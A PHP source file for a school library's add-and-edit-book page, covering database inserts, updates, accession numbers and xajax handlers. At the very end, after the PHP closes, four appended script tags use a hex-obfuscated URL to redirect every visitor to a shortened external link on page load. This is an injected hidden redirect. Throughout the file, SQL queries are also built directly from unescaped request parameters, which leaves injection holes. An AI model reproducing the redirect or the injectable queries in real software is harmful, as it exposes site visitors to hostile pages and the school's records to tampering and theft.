<?php
require_once('helper.php');
$msg        =  isset($_GET['msg']) ? $_GET['msg'] : '';
$id = base64_decode($_GET['id']);
class myCms extends Cms 
{
    function registerAjaxFunctions()
    {
        $this->xajax->registerFunction("get_Listing");
        $this->xajax->registerFunction("refMode");
        $this->xajax->registerFunction("update_status");
        $this->xajax->registerFunction("deleteRow");
        $this->xajax->registerFunction("editMode");
        $this->xajax->registerFunction("sorting");
        $this->xajax->registerFunction("sortTitle");
    }
}
$objMisc = new myCms();
$objMisc->initializeAjax(false,true);
$objMisc->dbFunc->parameters ="&sortOrder=".$sortOrder."&sortBy=".$sortBy ;
$objMisc->rec_pp = 20;
$objMisc->dbFunc->ajax_pagin = true;

//Code For Books Insertion And Updation

if($_SERVER['REQUEST_METHOD']=='POST' && isset($_POST['submit'])){
        if($_POST['purchase_date']!=''){
            $purchae_date1=$objMisc->changeDateFormat($_POST['purchase_date']);
        }
        else{
            $purchae_date1='';
        }
        $cond       = "";
        $cond       = "SCHOOL_ID = ".$_SESSION['SCHOOL_ID']." AND NAME ='$_POST[name]'";
        $recdata    = $objMisc->GiveValue($cond,"BOOK_ID","bookmaster");
    if($id)
    {
        //Code For Book Data Updation

        /*if($recdata !=$id && $recdata!='') 
            {        
                $_SESSION['msg'] = 5;
                if(!$_POST['BOOK_ID'])
                    {
                    $rowArray = "";
                    $rowArray = $_POST;
                    }
            }
            else
            {*/
                $where         =  "SCHOOL_ID ='$_SESSION[SCHOOL_ID]' AND BOOK_ID ='$id'";
                $quantity1     =  $objMisc->GiveValue($where,"QUANTITY","bookmaster");
                //echo $_POST['quantity'];
                $quantity      =  (($quantity1>$_POST['quantity'])?$quantity1:$_POST['quantity']);
                //exit;
                $rowArray1 = array(
                        'NAME'                         =>$_POST['name'],
                        'ISBN_NO'                      =>$_POST['isbn_no'],
                        'PATH'                         =>$_POST['path'],
                        'BOOK_CATEGORY_ID'             =>$_POST['book_category_id'],
                        'BOOK_SUB_CATEGORY_ID'         =>$_POST['book_sub_category_id'],
                        'CLASS_ID'                     =>$_POST['class_id'],
                        'SUBJECT_ID'                   =>$_POST['subject_id'],
                        'LANGUAGE_ID'                  =>$_POST['language_id'],
                        'EDITION'                      =>$_POST['edition'],
                        'BOOK_VOLUME'                  =>$_POST['book_volume'],
                        'BOOK_PAGES'                   =>$_POST['book_pages'],
                        'BOOK_COVER_TYPE'              =>$_POST['book_cover_type'],
                        'PUBLISHER_ID'                 =>$_POST['publisher_id'],
                        'SUPPLIER_ID'                  =>$_POST['supplier_id'],
                        'AUTHOR_ID'                    =>$_POST['author_id'],
                        'RACK_ID'                      =>$_POST['rack_no'],
                        'SHELVE_ID'                    =>$_POST['shelve'],
                        'PURCHASE_DATE'                =>$purchae_date1,
                        'QUANTITY'                     =>$quantity,
                        'COST'                         =>$_POST['cost'],
                        'MRP'                          =>$_POST['mrp'],
                        'UPDATED_DATE'                 =>date('Y-m-d H:i:s'),
                        'UPDATED_BY'                   =>$_SESSION['USER_ID'],
                        'UPDATED_BY_TYPE'              =>$_SESSION['USER_TYPE'],
                        );
                
                //print_r($rowArray1);exit;
                $prev_quantity=$objMisc->GiveValue(' BOOK_ID='.$id,'QUANTITY','bookmaster');
                $current_quanity=$_POST['quantity'];
                $val   = $objMisc->update("bookmaster",$rowArray1,$where);
                $last_insert_id=$id;
                
    //Code For Book Accession Nos In case quantity is Increased

                $loop_value=$current_quanity-$prev_quantity;
                $loop_value1=$prev_quantity-$current_quanity;
                if($current_quanity-$prev_quantity>0){
                $bookVal=$objMisc->GiveValue("SCHOOL_ID='$_SESSION[SCHOOL_ID]' ORDER BY `ID` DESC",'ACCESSION_NO','books');  //Value of Last Accession No
                //exit;
                if($bookVal==''){
                    $access='00000';
                }
                else{
                    $access=$bookVal;
                }  
                    for($m=0;$m<$loop_value;$m++) {
                    $access= sprintf("%05d", $access+1);
                    $book_code=$access;      //// Asscession No of the book 
                    $rowCode = array(
                        'SCHOOL_ID'         =>$_SESSION['SCHOOL_ID'],
                        'BOOK_ID'           =>$last_insert_id,
                        'ACCESSION_NO'      =>$book_code,
                        'UPDATED_DATE'      =>date('Y-m-d H:i:s'),
                        'UPDATED_BY'        =>$_SESSION['USER_ID'],
                        'UPDATED_BY_TYPE'   =>$_SESSION['USER_TYPE'],
                        );
                    //print_r($rowCode);exit;
                    $val1 = $objMisc->insert("books",$rowCode);
                     }
                 }
                 
                if($val && $val1){
                $_SESSION['msg'] = 2;
                }
                header("Location:library-manage-book-details.php?page=".$_REQUEST['page']);
                exit;
           // } 
    } 
    else 
    {

    //Code For New Book Data Insertion 

            $rowArray = array(
                'SCHOOL_ID'             =>$_SESSION['SCHOOL_ID'],
                'NAME'                  =>$_POST['name'],
                'ISBN_NO'               =>$_POST['isbn_no'],
                'PATH'                  =>$_POST['path'],
                'BOOK_CATEGORY_ID'      =>$_POST['book_category_id'],
                'BOOK_SUB_CATEGORY_ID'  =>$_POST['book_sub_category_id'],
                'CLASS_ID'              =>$_POST['class_id'],
                'SUBJECT_ID'            =>$_POST['subject_id'],
                'LANGUAGE_ID'           =>$_POST['language_id'],
                'RACK_ID'               =>$_POST['rack_no'],
                'SHELVE_ID'             =>$_POST['shelve'],
                'EDITION'               =>$_POST['edition'],
                'BOOK_VOLUME'           =>$_POST['book_volume'],
                'BOOK_PAGES'            =>$_POST['book_pages'],
                'BOOK_COVER_TYPE'       =>$_POST['book_cover_type'],
                'PUBLISHER_ID'          =>$_POST['publisher_id'],
                'SUPPLIER_ID'           =>$_POST['supplier_id'],
                'AUTHOR_ID'             =>$_POST['author_id'],
                'PURCHASE_DATE'         =>$purchae_date1,
                'QUANTITY'              =>$_POST['quantity'],
                'COST'                  =>$_POST['cost'],
                'MRP'                   =>$_POST['mrp'],
                'CREATED_DATE'          =>date('Y-m-d H:i:s'),
                'ADDED_BY'              =>$_SESSION['USER_ID'],
                'ADDED_BY_TYPE'         =>$_SESSION['USER_TYPE'],
                );
            
            
            /* if($recdata)
             {           
                $_SESSION['msg'] = 5;
                if(!$_POST['BOOK_ID'])
                    {
                    $rowArray = "";
                    $rowArray = $_POST;
                    }
            }
            else
            {*/
                $val = $objMisc->insert("bookmaster",$rowArray);
                $last_insert_id=mysql_insert_id();
    // For Auto generation Of Book Accession No's
                if(!empty($last_insert_id)){
                    $AccessionExists=$objMisc->GiveValue("ACCESSION_NO='$_POST[accession_no]' AND SCHOOL_ID='$_SESSION[SCHOOL_ID]' ORDER BY `ID` DESC",'ACCESSION_NO','books'); 
                    if($AccessionExists!=''){
                        $_SESSION['msg'] = 6;
                        if(!$_POST['BOOK_ID'])
                            {
                            $rowArray = "";
                            $rowArray = $_POST;
                            }
                    }
                    else{
                        $bookVal=$objMisc->GiveValue("SCHOOL_ID='$_SESSION[SCHOOL_ID]' ORDER BY `ID` DESC",'ACCESSION_NO','books');  //Value of Last Accession No
                        if($bookVal==''){
                            $access='00001';
                        }
                        else{
                            $access=$_POST['accession_no'];
                            //$access= sprintf("%05d", $access-1);
                        }
                       
                        for($m=0;$m<$_POST['quantity'];$m++) {
                            $access_new= sprintf("%05d", $access);
                            $AccessionNoExists=$objMisc->GiveValue("ACCESSION_NO='$access_new' AND SCHOOL_ID='$_SESSION[SCHOOL_ID]' ORDER BY `ID` DESC",'ACCESSION_NO','books'); 
                            if($AccessionNoExists==''){
                                $book_code=$access_new;      // Asscession No of the book   
                                $rowCode = array(
                                    'SCHOOL_ID'       =>$_SESSION['SCHOOL_ID'],
                                    'BOOK_ID'         =>$last_insert_id,
                                    'ACCESSION_NO'    =>$book_code,
                                    'CREATED_DATE'    =>date('Y-m-d H:i:s'),
                                    'ADDED_BY'        =>$_SESSION['USER_ID'],
                                    'ADDED_BY_TYPE'   =>$_SESSION['USER_TYPE'],
                                    );
                                $val1 = $objMisc->insert("books",$rowCode);
                            }
                            else{
                                $m=$m-1;
                            }
                            $access = sprintf("%05d", $access+1).'<br>';
                        }
                        $_SESSION['msg'] = 1;
                        header("location:library-book-details.php");
                        exit;   
                    }
                }
                else{
                    $_SESSION['msg'] = 7;
                    header("location:library-book-details.php");
                    exit;
                }
    }       
}
    
//Code For error And Success Messges

$msg = isset($_SESSION['msg']) ? $_SESSION['msg'] : $msg;
unset($_SESSION['msg']);

switch ($msg)
{
    case 1:
        $msg = "Book  added successfully.";
    break;
    case 2:
        $msg = "Book updated successfully.";
    break;
    case 3:
        $msg = "Book has been deleted successfully.";
    break;
    case 4:
        $errormsg = "You can not delete this book.";
        $msg = "";
    break;
    case 5:
        $errormsg = "Book already exists.";
        $msg = "";
    break;
    case 6:
        $errormsg = "Accession no. already exists.";
        $msg = "";
    break;
    case 7:
        $errormsg = "Something went wrong.Please try again.";
        $msg = "";
    break;
}
if($id)
{
  $where_con= " SCHOOL_ID='$_SESSION[SCHOOL_ID]' AND BOOK_ID='$id'";
  $rowArray=$objMisc->getRow("bookmaster",$where_con);  
}
$where                        =   " 1 = 1 and SCHOOL_ID = ".$_SESSION['SCHOOL_ID']." and STATUS = 'A' ";
$classArray_book_category     =   $objMisc->myFunc->fnWriteOptionList($rowArray['book_category_id'],'NAME,BOOK_CATEGORY_ID','book_category',$where." AND PARENT='0'",0,0,0);
if($id){
    $classArray_book_sub_category =   $objMisc->myFunc->fnWriteOptionList($rowArray['book_sub_category_id'],'NAME,BOOK_CATEGORY_ID','book_category',$where." AND PARENT='$rowArray[book_category_id]'",0,0,0);
}
//Code For Form Fields Dropdowns

$referenceData                =   $objMisc->myFunc->fnWriteOptionListId($rowArray['book_id'],'NAME,BOOK_ID,ISBN_NO','bookmaster',$where." ORDER BY `NAME` ASC",0,0,0);
$classArray_class             =   $objMisc->myFunc->fnWriteOptionList($rowArray['class_id'],'CLASS_NAME,CLASS_ID','class',$where." ORDER BY CLASS_CODE ASC",0,0,0);
$classArray_subject           =   $objMisc->myFunc->fnWriteOptionList($rowArray['subject_id'],'SUBJECT_NAME,SUBJECT_ID','subject',$where." AND CLASS_ID='$rowArray[class_id]'",0,0,0);
$classArray_publisher         =   $objMisc->myFunc->fnWriteOptionList($rowArray['publisher_id'],'PUBLISHER,PUBLISHER_ID','publishermaster',$where,0,0,0);
$classArray_supplier          =   $objMisc->myFunc->fnWriteOptionList($rowArray['supplier_id'],'SUPPLIER,SUPPLIER_ID','suppliermaster',$where,0,0,0);
$classArray_author            =   $objMisc->myFunc->fnWriteOptionListId($rowArray['author_id'],'AUTHOR,AUTHOR_ID,ID','authormaster',$where." order by AUTHOR asc",0,0,0);
$classArray_language          =   $objMisc->myFunc->fnWriteOptionList($rowArray['language_id'],'LANGUAGE,LANGUAGE_ID','languagemaster',$where,0,0,0);
$classArray_rack              =   $objMisc->myFunc->fnWriteOptionList($rowArray['rack_id'],'RACK_NO,RACK_ID','rackmaster',$where,0,0,0);
$classArray_shelve            =   $objMisc->myFunc->fnWriteOptionList($rowArray['shelve_id'],'SHELVE,SHELVE_ID','shelvemaster',$where." AND RACK_ID='$rowArray[rack_id]'",0,0,0);

//Code To get Last Value Of Accesion No form Database according to school

$bookValue   =   $objMisc->GiveValue("SCHOOL_ID='$_SESSION[SCHOOL_ID]'",'MAX(ACCESSION_NO)','books');  //Value of Last Accession No

                if($bookValue==''){
                    $accession='00000';
                }
                else{
                    $accession=$bookValue;
                }
                $accession= sprintf("%05d", $accession+1);

if(isset($_GET['id']) && !empty($_GET['id'])){
    $pageheading = "Edit Book Information";
}else{
   $pageheading = "Add New Book"; 
}
$pageheading1 = "Search From Existing Records";
$add    =   "";
if(in_array('60_A',$_SESSION['pass'])  || $_SESSION['USER_TYPE']=='SCH')
{
   $add = true; 
}elseif( (in_array('60_E',$_SESSION['pass']) && !empty($id) )  || $_SESSION['USER_TYPE']=='SCH' ){
   $add = true;  
}

$smartyVars['accession']        =   $accession;
$smartyVars['referenceData']    =   $referenceData;
$smartyVars['classArray']       =   $classArray_rack;
$smartyVars['classArray1']      =   $classArray_shelve;
$smartyVars['author']           =   $classArray_author;
$smartyVars['supplier']         =   $classArray_supplier;
$smartyVars['publisher']        =   $classArray_publisher;
$smartyVars['subject']          =   $classArray_subject;
$smartyVars['class']            =   $classArray_class;
$smartyVars['language']         =   $classArray_language;
$smartyVars['category']         =   $classArray_book_category;
$smartyVars['subcategory']      =   $classArray_book_sub_category;
$smartyVars['errormsg']         =   $errormsg;
$smartyVars['add']              =   $add;
$smartyVars['group']            =   $id;
$smartyVars['rowRec']           =   $rowArray;
$smartyVars['pageheading']      =   $pageheading;
$smartyVars['pageheading1']     =   $pageheading1;
$smartyVars['classData']        =   $pagin_recs;
$smartyVars['msg']              =   $msg;
$smartyVars['page']             =   $_REQUEST['page'];
$objMisc->displayPage("header-inner,library-book-details,footer-inner",$smartyVars);   

//Funtion Is used to copy data from database(Referance data to insert new book)

function refMode($id)
{
  global $objMisc;
  $objResponse = new XajaxResponse();
  $edit='edit';
  $where=" SCHOOL_ID='$_SESSION[SCHOOL_ID]' AND BOOK_ID=".$id;
  $row=$objMisc->getRow('bookmaster',$where);
  if(!empty($row))
  {
    $where=" SCHOOL_ID='$_SESSION[SCHOOL_ID]' AND STATUS='A'";
    $objResponse->addAssign('hidaction','value','edit');
    $objResponse->addAssign('str','innerHTML','Edit');
    $objResponse->addAssign('BOOK_ID','value',$row['book_id']);
    $objResponse->addAssign('name','value',$row['name']);
    $objResponse->addAssign('edition','value',$row['edition']);
    $objResponse->addAssign('book_volume','value',$row['book_volume']);
    $objResponse->addAssign('book_pages','value',$row['book_pages']);
    $objResponse->addAssign('cost','value',$row['cost']);
    $objResponse->addAssign('mrp','value',$row['mrp']);
    $objResponse->addAssign('book_cover_type','value',$row['book_cover_type']);
    $objResponse->addAssign('quantity','value',$row['quantity']);
    $objResponse->addAssign('datepicker1','value',date("d/m/Y",strtotime($row['purchase_date'])));
    if($row['path']!=''){
    $img="thumb.php?img=".$row['path']."&h=146&w=146";
    }else{
    $img="thumb.php?img=images/book.jpg&h=140&w=146";    
    }
    $objResponse->addAssign('logo','innerHTML', '<img src="'.$img.'"/><input type="hidden" name="path" value="'.$row['path'].'">');
   
    $classArray_book_category     =   $objMisc->myFunc->fnWriteOptionList('','NAME,BOOK_CATEGORY_ID','book_category',$where." AND PARENT='0'",0,0,0);
    $classArray_book_sub_category =   $objMisc->myFunc->fnWriteOptionList($row['book_sub_category_id'],'NAME,BOOK_CATEGORY_ID','book_category',$where." AND PARENT='$row[book_category_id]'",0,0,0);
    $classArray_class             =   $objMisc->myFunc->fnWriteOptionList($row['class_id'],'CLASS_NAME,CLASS_ID','class',$where,0,0,0);
    $classArray_subject           =   $objMisc->myFunc->fnWriteOptionList($row['subject_id'],'SUBJECT_NAME,SUBJECT_ID','subject',$where." AND CLASS_ID='$row[class_id]'",0,0,0);
    $classArray_publisher         =   $objMisc->myFunc->fnWriteOptionList($row['publisher_id'],'PUBLISHER,PUBLISHER_ID','publishermaster',$where,0,0,0);
    $classArray_supplier          =   $objMisc->myFunc->fnWriteOptionList($row['supplier_id'],'SUPPLIER,SUPPLIER_ID','suppliermaster',$where,0,0,0);
    $classArray_author            =   $objMisc->myFunc->fnWriteOptionListId($row['author_id'],'AUTHOR,AUTHOR_ID,ID','authormaster',$where,0,0,0);
    $classArray_language          =   $objMisc->myFunc->fnWriteOptionList($row['language_id'],'LANGUAGE,LANGUAGE_ID','languagemaster',$where,0,0,0);
    $classArray_rack              =   $objMisc->myFunc->fnWriteOptionList($row['rack_id'],'RACK_NO,RACK_ID','rackmaster',$where,0,0,0);
    $classArray_shelve            =   $objMisc->myFunc->fnWriteOptionList($row['shelve_id'],'SHELVE,SHELVE_ID','shelvemaster',$where." AND RACK_ID='$row[rack_id]'",0,0,0);
    
    $objResponse->addAssign('book_category_id','innerHTML',$classArray_book_category);
    $objResponse->addAssign('book_sub_category_id','innerHTML',$classArray_book_sub_category);
    $objResponse->addAssign('class_id','innerHTML',$classArray_class);
    $objResponse->addAssign('response','innerHTML',$classArray_subject);
    $objResponse->addAssign('publisher_id','innerHTML',$classArray_publisher);
    $objResponse->addAssign('supplier_id','innerHTML',$classArray_supplier);
    $objResponse->addAssign('author_id','innerHTML',$classArray_author);
    $objResponse->addAssign('language_id','innerHTML',$classArray_language);
    $objResponse->addAssign('rack_no','innerHTML',$classArray_rack);
    $objResponse->addAssign('shelve','innerHTML',$classArray_shelve);
  }
  return $objResponse;
}

//Code To Update Status

function update_status($id,$status)
{
    global $objMisc;
    $objResponse = new XajaxResponse();
    $changeTo = ($status=='A') ? 'D' : 'A';
    $row = array(
                    'STATUS' => $changeTo
                );
    $where = "BOOK_ID =".$id;
    $objMisc->update("bookmaster",$row,$where);
    $imgName =($changeTo == 'D') ? 'images/deactive-btn.gif':'images/active-btn.gif';
    if($changeTo=='A')
    {
        $title= 'Deactivate';
        $msg = 'Book has been activated successfully.';
    }
    else
    {
        $title= 'Activate';
        $msg = 'Book has been deactivated successfully.';
    } 
    $objResponse->addAssign('imgStatus'.$id,'src',$imgName);
    $objResponse->addAssign('imgStatus'.$id,'alt',$title);
    $objResponse->addAssign('imgStatus'.$id,'title',$title);
    $objResponse->addAssign('enumStatus'.$id,'value',$changeTo);
    $objResponse->addScript("document.getElementById('msg').style.display='inline';");
    $objResponse->addAssign('msg','innerHTML','&nbsp;');
    $objResponse->addAssign('msg','innerHTML','<div class="notify notify-success"><a class="close" href="javascript:;"><img src="images/close.png" /></a><h3>'.$msg.'</h3></div>'); 
    $objResponse->addScript("setTimeout(\"document.getElementById('msg').style.display='none'\",3000);");
    return $objResponse;
} 

//Code For Book Data Deletion

function deleteRow($id)
{
    global $objMisc;
    $objResponse = new XajaxResponse();
    $idArray = explode(',',$id);
    foreach($idArray as $bid)
    {
       $where3      = "SCHOOL_ID =".$_SESSION['SCHOOL_ID']." and BOOK_ID = ".$bid;
       $val = $objMisc->delete("bookmaster",$where3);
      
       
    }
    if($val){
       $_SESSION['msg'] = 3;
    } else {
       $_SESSION['msg'] = 4; 
    }
    $sscript .= "var a;";
    $sscript .= "a = window.location;";
    $sscript .= "window.location = a;";
    $objResponse->addScript($sscript);
    return $objResponse;
}        
?>
<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>
<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>
<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>
<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>